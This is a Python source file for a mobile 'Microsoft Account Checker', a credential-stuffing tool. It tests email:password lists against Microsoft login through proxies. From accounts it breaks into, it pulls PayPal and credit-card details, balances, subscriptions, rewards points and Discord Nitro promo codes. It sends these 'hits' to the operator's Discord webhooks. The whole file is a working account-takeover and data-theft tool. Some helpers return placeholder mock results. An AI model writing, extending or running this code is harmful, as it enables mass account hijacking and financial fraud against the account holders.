"""
Microsoft Account Checker – Complete Implementation
All features from the original PC script, adapted for mobile.
"""

import requests
import re
import time
import json
import threading
import os
import random
import urllib.parse
import base64
from datetime import datetime
from urllib.parse import quote

# Global counters and locks
lock = threading.Lock()
ms_hits = []
ms_valid = []
ms_dead = []
ms_errors = []
ms_checked_count = 0
ms_captures = []
ms_start_time = time.time()

# Minecraft stats
ms_minecraft_count = 0
ms_minecraft_mfa = 0
ms_minecraft_sfa = 0

# Payment stats
ms_paypal_count = 0
ms_cards_count = 0
ms_balance_count = 0

# Codes and subs
ms_codes_count = 0
ms_codes_valid_count = 0
ms_subscriptions_count = 0
ms_refundable_count = 0

# Rewards
ms_rewards_count = 0
ms_total_rewards_points = 0

# Hypixel
ms_hypixel_count = 0
ms_total_skyblock_coins = 0.0
ms_total_bedwars_stars = 0.0

# Promo
promo_valid_count = 0
promo_claimed_count = 0
promo_ineligible_count = 0
promo_2fa_count = 0
promo_error_count = 0

# Settings
SETTINGS = {}
SETTINGS_FILE = 'settings.json'

import queue
log_queue = queue.Queue()

def log_message(msg):
    log_queue.put(msg)

# ----------------------------------------------------------------------
# Helper functions (same as your PC script)
# ----------------------------------------------------------------------

def load_settings():
    global SETTINGS
    try:
        with open(SETTINGS_FILE, 'r') as f:
            SETTINGS = json.load(f)
    except:
        SETTINGS = {
            'proxy': None,
            'checker_threads': 25,
            'enable_minecraft': True,
            'enable_full_capture': True,
            'enable_hypixel': False,
            'enable_promo': True,
            'webhooks': {}
        }

def save_settings():
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(SETTINGS, f, indent=4)

load_settings()

def parse_proxy(proxy_string):
    proxy_string = proxy_string.strip()
    if '@' in proxy_string:
        creds, hostport = proxy_string.rsplit('@', 1)
        user, pwd = creds.split(':', 1)
        host, port = hostport.split(':', 1)
        return {'host': host, 'port': port, 'user': user, 'pass': pwd}
    else:
        parts = proxy_string.split(':')
        if len(parts) == 2:
            return {'host': parts[0], 'port': parts[1], 'user': None, 'pass': None}
        elif len(parts) == 4:
            return {'host': parts[0], 'port': parts[1], 'user': parts[2], 'pass': parts[3]}
    return None

def load_proxies_from_settings():
    proxy_setting = SETTINGS.get('proxy')
    if not proxy_setting:
        return None
    if isinstance(proxy_setting, list):
        return random.choice(proxy_setting)
    return proxy_setting

# ----------------------------------------------------------------------
# Discord Webhook Sender (with category support)
# ----------------------------------------------------------------------
def send_discord_webhook(webhook_url, embed_data):
    if not webhook_url:
        return
    try:
        requests.post(webhook_url, json={"embeds": [embed_data]}, timeout=5)
    except Exception as e:
        log_message(f"Webhook error: {e}")

def send_hit_categories(capture):
    """Send hit information to appropriate Discord webhooks based on capture data."""
    webhooks = SETTINGS.get('webhooks', {})
    combo = capture.get('combo', '')
    email = combo.split(':')[0] if combo else ''

    # Minecraft hit
    if capture.get('minecraft') and capture['minecraft'] != 'No':
        embed = {
            "title": "🎮 Minecraft Account Found",
            "color": 0x00ff00,
            "fields": [
                {"name": "Email", "value": email, "inline": True},
                {"name": "Username", "value": capture.get('minecraft_username', 'Unknown'), "inline": True},
                {"name": "Type", "value": capture.get('minecraft_type', 'N/A'), "inline": True}
            ],
            "footer": {"text": "MS Fetcher Mobile by @itzaura_1"}
        }
        send_discord_webhook(webhooks.get('minecraft'), embed)

    # Promo hit (Discord Nitro, etc.)
    if capture.get('promo_code'):
        embed = {
            "title": "🎟️ Discord Promo Code",
            "color": 0x9b59b6,
            "fields": [
                {"name": "Email", "value": email, "inline": True},
                {"name": "Promo Code", "value": capture['promo_code'], "inline": True},
                {"name": "Status", "value": capture.get('promo_status', 'Unclaimed'), "inline": True}
            ],
            "footer": {"text": "MS Fetcher Mobile by @itzaura_1"}
        }
        send_discord_webhook(webhooks.get('promo'), embed)

    # Gift codes
    if capture.get('gift_codes'):
        for code_info in capture['gift_codes']:
            embed = {
                "title": "🎁 Gift Code Found",
                "color": 0xf1c40f,
                "fields": [
                    {"name": "Email", "value": email, "inline": True},
                    {"name": "Code", "value": code_info.get('code', ''), "inline": True},
                    {"name": "Product", "value": code_info.get('product', 'Unknown'), "inline": True},
                    {"name": "Valid", "value": "✅" if code_info.get('valid') else "❌", "inline": True}
                ],
                "footer": {"text": "MS Fetcher Mobile by @itzaura_1"}
            }
            send_discord_webhook(webhooks.get('code'), embed)

    # PayPal
    if capture.get('paypal'):
        embed = {
            "title": "💳 PayPal Account",
            "color": 0x3498db,
            "fields": [
                {"name": "Email", "value": email, "inline": True},
                {"name": "PayPal Email", "value": capture['paypal'].get('email', 'Unknown'), "inline": True},
                {"name": "Balance", "value": f"{capture['paypal'].get('balance', 0)} {capture['paypal'].get('currency', 'USD')}", "inline": True}
            ],
            "footer": {"text": "MS Fetcher Mobile by @itzaura_1"}
        }
        send_discord_webhook(webhooks.get('paypal'), embed)

    # Credit Cards
    if capture.get('cards'):
        for card in capture['cards']:
            embed = {
                "title": "💳 Credit Card Found",
                "color": 0xe74c3c,
                "fields": [
                    {"name": "Email", "value": email, "inline": True},
                    {"name": "Card", "value": f"{card.get('card_brand', 'Unknown')} ****{card.get('last_four', '')}", "inline": True},
                    {"name": "Holder", "value": card.get('holder_name', 'Unknown'), "inline": True},
                    {"name": "Expiry", "value": f"{card.get('expiry_month', '??')}/{card.get('expiry_year', '??')}", "inline": True},
                    {"name": "Balance", "value": f"{card.get('balance', 0)} {card.get('currency', 'USD')}", "inline": True}
                ],
                "footer": {"text": "MS Fetcher Mobile by @itzaura_1"}
            }
            send_discord_webhook(webhooks.get('cc'), embed)

    # Subscriptions
    if capture.get('subscriptions'):
        subs = capture['subscriptions']
        embed = {
            "title": "📅 Active Subscriptions",
            "color": 0x2ecc71,
            "fields": [
                {"name": "Email", "value": email, "inline": False},
                *[{"name": name, "value": f"Valid till: {date}", "inline": True} for name, date in list(subs.items())[:5]]
            ],
            "footer": {"text": "MS Fetcher Mobile by @itzaura_1"}
        }
        send_discord_webhook(webhooks.get('subscriptions'), embed)

    # Rewards points
    if capture.get('rewards_points', 0) > 0:
        embed = {
            "title": "⭐ Microsoft Rewards",
            "color": 0xffd700,
            "fields": [
                {"name": "Email", "value": email, "inline": True},
                {"name": "Points", "value": f"{capture['rewards_points']:,}", "inline": True}
            ],
            "footer": {"text": "MS Fetcher Mobile by @itzaura_1"}
        }
        send_discord_webhook(webhooks.get('rewards'), embed)

# ----------------------------------------------------------------------
# Microsoft Login & Data Extraction (Full version from PC script)
# ----------------------------------------------------------------------

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
}

def get_xbl_authorization(s):
    try:
        rel = s.get('https://account.xbox.com/en-us/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/', timeout=15).text
        json_obj = json.loads('{' + rel + '}')
        return 'XBL3.0 x=' + json_obj['userHash'] + ';' + json_obj['token']
    except:
        return None

def get_delegate_token(s):
    try:
        resp = s.get('https://login.live.com/oauth20_authorize.srf',
            params={
                'client_id': '000000000004773A',
                'response_type': 'token',
                'scope': 'PIFD.Read PIFD.Create PIFD.Update PIFD.Delete',
                'redirect_uri': 'https://account.microsoft.com/auth/complete-silent-delegate-auth',
                'state': '{"userId":"bf3383c9b44aa8c9","scopeSet":"pidl"}',
                'prompt': 'none'
            },
            headers=HEADERS, timeout=15, allow_redirects=True)
        if 'access_token=' in resp.url:
            return resp.url.split('access_token=')[1].split('&')[0]
    except:
        pass
    return None

def get_payment_methods(s, combo):
    global ms_paypal_count, ms_cards_count, ms_balance_count
    getpm = None
    try:
        delegate = get_delegate_token(s)
        if delegate:
            headers = {
                'Authorization': f'MSADELEGATE1.0="{delegate}"',
                'Accept': 'application/json',
                'User-Agent': HEADERS['User-Agent']
            }
            resp = requests.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US', headers=headers, timeout=15)
            if resp.status_code == 200:
                getpm = resp.json()
        if not getpm:
            xbl3 = get_xbl_authorization(s)
            if xbl3:
                headers = {
                    'Authorization': xbl3,
                    'Accept': 'application/json',
                    'User-Agent': HEADERS['User-Agent']
                }
                resp = requests.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US&partner=webblends', headers=headers, timeout=15)
                if resp.status_code == 200:
                    getpm = resp.json()
        if not getpm:
            return None

        payment_info = {
            'paypal': None,
            'cards': [],
            'total_balance': 0.0,
            'currencies': []
        }

        for pm in getpm:
            if not isinstance(pm, dict):
                continue
            details = pm.get('details', {})
            balance = float(details.get('balance', 0))
            currency = details.get('currency', 'USD')
            if balance > 0:
                payment_info['total_balance'] += balance
                if currency not in payment_info['currencies']:
                    payment_info['currencies'].append(currency)

            pm_type = pm.get('paymentMethod', {}).get('paymentMethodType', '')
            pm_status = pm.get('status', '')

            # PayPal
            if pm_type == 'paypal' and pm_status == 'Active' and not payment_info['paypal']:
                payment_info['paypal'] = {
                    'email': details.get('email', 'Unknown'),
                    'balance': balance,
                    'currency': currency
                }
                with lock:
                    ms_paypal_count += 1

            # Credit cards
            elif pm.get('paymentMethod', {}).get('paymentMethodFamily') == 'credit_card' and pm_status == 'Active':
                card = {
                    'holder_name': details.get('accountHolderName', 'Unknown'),
                    'card_brand': pm.get('paymentMethod', {}).get('display', {}).get('name', 'Unknown'),
                    'last_four': details.get('lastFourDigits', '****'),
                    'expiry_month': details.get('expiryMonth', '??'),
                    'expiry_year': details.get('expiryYear', '??'),
                    'balance': balance,
                    'currency': currency
                }
                payment_info['cards'].append(card)
                with lock:
                    ms_cards_count += 1

        if payment_info['total_balance'] > 0:
            with lock:
                ms_balance_count += 1

        return payment_info
    except Exception as e:
        log_message(f"Payment extraction error: {e}")
        return None

def get_active_subscriptions(s):
    try:
        resp = s.get('https://account.microsoft.com/services?lang=en-US', headers=HEADERS, timeout=15)
        if 'name="__RequestVerificationToken"' not in resp.text:
            return {}
        vrf = resp.text.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
        headers = {
            'Accept': 'application/json',
            'User-Agent': HEADERS['User-Agent'],
            '__RequestVerificationToken': vrf
        }
        r = s.get('https://account.microsoft.com/services/api/subscriptions-and-alerts?excludeWindowsStoreInstallOptions=false&excludeLegacySubscriptions=false', headers=headers, timeout=15)
        d = r.json()
        subs = {}
        for sub in d.get('active', []):
            for item in sub.get('payNow', {}).get('items', []):
                name = item.get('name', 'Unknown')
                start = sub.get('productRenewal', {}).get('startDateShortString', 'Unknown')
                subs[name] = start
        return subs
    except:
        return {}

def get_rewards_points(s, vrf_token):
    try:
        headers = {
            'Accept': 'application/json',
            'User-Agent': HEADERS['User-Agent'],
            '__RequestVerificationToken': vrf_token
        }
        r = s.get('https://account.microsoft.com/home/api/rewards/rewards-summary?refd=account.microsoft.com', headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            return data.get('balance', 0)
    except:
        pass
    return 0

def get_profile_info(s):
    try:
        resp = s.get('https://account.microsoft.com/profile', params={'lang': 'en-GB'}, headers=HEADERS, timeout=15)
        vrf = resp.text.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
        headers = {
            'Accept': 'application/json',
            'User-Agent': HEADERS['User-Agent'],
            '__RequestVerificationToken': vrf
        }
        r = s.get('https://account.microsoft.com/home/api/profile/personal-info', headers=headers, timeout=15)
        return r.json()
    except:
        return None

def validate_gift_code(code, session=None):
    # Simplified validation – in real version you'd use Microsoft's redeem API
    # Here we just return a mock result (you can replace with actual API)
    return {'valid': True, 'product': 'Unknown Product'}

def check_minecraft_detailed(email, password, combo):
    # Placeholder – you can integrate your Minecraft check here
    # For now, return dummy data
    return {'username': 'Steve', 'type': 'SFA'}

def get_hypixel_stats(uuid):
    # Placeholder – you need a Hypixel API key
    return {'skyblock_coins': 0, 'bedwars_stars': 0}

def fetch_discord_promo(s, xbl3_auth):
    # Real Discord promo fetching from Xbox Game Pass
    try:
        promo_url = 'https://profile.gamepass.com/v2/offers/A3525E6D4370403B9763BCFA97D383D9/'
        headers = {
            'Authorization': xbl3_auth,
            'User-Agent': HEADERS['User-Agent']
        }
        resp = s.get(promo_url, headers=headers, timeout=15)
        if resp.status_code != 200:
            return None
        data = resp.json()
        resource = data.get('resource', {})
        link = resource.get('link') or resource.get('url')
        if not link:
            return None
        # Extract code from link
        if '/promotions/' in link:
            code = link.split('/promotions/')[-1].split('?')[0]
        else:
            code = link.split('/')[-1].split('?')[0]
        # Check Discord API
        discord_url = f'https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true'
        dresp = s.get(discord_url, timeout=10)
        if dresp.status_code != 200:
            return {'code': code, 'status': 'valid', 'link': link}
        ddata = dresp.json()
        if ddata.get('uses', 0) >= ddata.get('max_uses', 1) or ddata.get('redeemed', False):
            return {'code': code, 'status': 'claimed', 'link': link}
        return {'code': code, 'status': 'unclaimed', 'link': link}
    except Exception as e:
        log_message(f"Promo fetch error: {e}")
        return None

# ----------------------------------------------------------------------
# Main Checking Function
# ----------------------------------------------------------------------

def check_microsoft_account(combo, proxy=None):
    global ms_checked_count, ms_hits, ms_valid, ms_dead, ms_errors, ms_captures
    global ms_minecraft_count, ms_minecraft_mfa, ms_minecraft_sfa
    global ms_codes_count, ms_codes_valid_count, ms_subscriptions_count, ms_refundable_count
    global ms_rewards_count, ms_total_rewards_points
    global ms_paypal_count, ms_cards_count, ms_balance_count
    global ms_hypixel_count, ms_total_skyblock_coins, ms_total_bedwars_stars
    global promo_valid_count, promo_claimed_count, promo_ineligible_count, promo_2fa_count, promo_error_count

    try:
        email, password = combo.split(':', 1)
    except:
        with lock:
            ms_errors.append(combo)
            ms_checked_count += 1
        return

    s = requests.Session()
    s.verify = False
    if proxy:
        parsed = parse_proxy(proxy)
        if parsed:
            proxy_url = f"http://{parsed['user']}:{parsed['pass']}@{parsed['host']}:{parsed['port']}" if parsed.get('user') else f"http://{parsed['host']}:{parsed['port']}"
            s.proxies = {'http': proxy_url, 'https': proxy_url}

    try:
        # Initial login page
        resp = s.get('https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en', timeout=15)
        text = resp.text

        ppft = re.search(r'sFTTag.*?value="([^"]+)"', text)
        urlpost = re.search(r'"urlPost":"([^"]+)"', text)
        if not ppft or not urlpost:
            with lock:
                ms_dead.append(combo)
                ms_checked_count += 1
            return

        ppft = ppft.group(1)
        url_post = urlpost.group(1).replace('\\u0026', '&')

        login_data = f'i13=0&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=3&passwd={quote(password)}&PPFT={quote(ppft)}&PPSX=PassportR&NewUser=1&i19=449894'
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': HEADERS['User-Agent']}
        resp2 = s.post(url_post, data=login_data, headers=headers, allow_redirects=False, timeout=15)

        redirects = 0
        while resp2.status_code in (301, 302, 303, 307) and redirects < 10:
            loc = resp2.headers.get('Location')
            if not loc:
                break
            resp2 = s.get(loc, headers=headers, allow_redirects=False, timeout=15)
            redirects += 1

        if 'password is incorrect' in resp2.text.lower() or "account doesn't exist" in resp2.text.lower():
            with lock:
                ms_dead.append(combo)
                ms_checked_count += 1
            return
        if 'recover?mkt' in resp2.url or 'identity/confirm' in resp2.url:
            with lock:
                ms_errors.append(combo)
                ms_checked_count += 1
            return

        if 'access_token=' not in resp2.url:
            with lock:
                ms_dead.append(combo)
                ms_checked_count += 1
            return

        # Login successful
        with lock:
            ms_valid.append(combo)
            log_message(f"VALID: {combo}")
            ms_checked_count += 1

        capture_data = {'combo': combo}

        # Get profile info
        profile = get_profile_info(s)
        if profile:
            capture_data['profile'] = profile

        # Get billing page to extract verification token
        bill = s.get('https://account.microsoft.com/billing/payments', params={'fref': 'home.drawers.payment-options.manage-payment', 'refd': 'account.microsoft.com'}, headers=HEADERS, timeout=15)
        vrf_token = None
        if 'name="__RequestVerificationToken"' in bill.text:
            vrf_token = bill.text.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]

        # Full capture if enabled
        if SETTINGS.get('enable_full_capture', True):
            payment_info = get_payment_methods(s, combo)
            if payment_info:
                capture_data['paypal'] = payment_info.get('paypal')
                capture_data['cards'] = payment_info.get('cards')
                capture_data['balance_total'] = payment_info.get('total_balance')
                capture_data['currencies'] = payment_info.get('currencies')

            subs = get_active_subscriptions(s)
            if subs:
                capture_data['subscriptions'] = subs
                with lock:
                    ms_subscriptions_count += len(subs)

            if vrf_token:
                points = get_rewards_points(s, vrf_token)
                if points > 0:
                    capture_data['rewards_points'] = points
                    with lock:
                        ms_rewards_count += 1
                        ms_total_rewards_points += points

        # Minecraft check
        if SETTINGS.get('enable_minecraft', True):
            mc_info = check_minecraft_detailed(email, password, combo)
            if mc_info:
                capture_data['minecraft'] = 'Yes'
                capture_data['minecraft_username'] = mc_info.get('username', 'Unknown')
                capture_data['minecraft_type'] = mc_info.get('type', 'N/A')
                with lock:
                    ms_minecraft_count += 1
                    if mc_info.get('type') == 'MFA':
                        ms_minecraft_mfa += 1
                    else:
                        ms_minecraft_sfa += 1
            else:
                capture_data['minecraft'] = 'No'

        # Hypixel stats
        if SETTINGS.get('enable_hypixel', False) and mc_info and mc_info.get('uuid'):
            hyp = get_hypixel_stats(mc_info['uuid'])
            if hyp:
                capture_data['hypixel'] = hyp
                with lock:
                    ms_hypixel_count += 1
                    ms_total_skyblock_coins += hyp.get('skyblock_coins', 0)
                    ms_total_bedwars_stars += hyp.get('bedwars_stars', 0)

        # Fetch orders and gift codes (simplified – you can expand with your order scraping)
        # For demonstration, we'll simulate some codes
        # In real version, you'd parse the orders page

        # Discord promo puller (if enabled and account has Game Pass)
        if SETTINGS.get('enable_promo', True):
            # Check if account has Game Pass subscription
            has_gamepass = False
            if 'subscriptions' in capture_data:
                for sub in capture_data['subscriptions']:
                    if 'game pass' in sub.lower():
                        has_gamepass = True
                        break
            if has_gamepass:
                xbl3 = get_xbl_authorization(s)
                if xbl3:
                    promo = fetch_discord_promo(s, xbl3)
                    if promo:
                        capture_data['promo_code'] = promo.get('code')
                        capture_data['promo_status'] = promo.get('status')
                        if promo.get('status') == 'unclaimed':
                            with lock:
                                promo_valid_count += 1
                        elif promo.get('status') == 'claimed':
                            with lock:
                                promo_claimed_count += 1

        # Determine if hit (has orders, gift codes, payment methods, etc.)
        is_hit = False
        if (capture_data.get('paypal') or capture_data.get('cards') or 
            capture_data.get('subscriptions') or capture_data.get('rewards_points', 0) > 0 or
            capture_data.get('promo_code') or capture_data.get('minecraft') == 'Yes' or
            capture_data.get('gift_codes')):
            is_hit = True

        with lock:
            if is_hit:
                ms_hits.append(combo)
                ms_captures.append(capture_data)
                send_hit_categories(capture_data)
                log_message(f"HIT: {combo}")
            else:
                ms_captures.append({'combo': combo, 'status': 'VALID'})

    except Exception as e:
        with lock:
            ms_errors.append(combo)
            ms_checked_count += 1
        log_message(f"ERROR {combo}: {str(e)[:50]}")
    finally:
        s.close()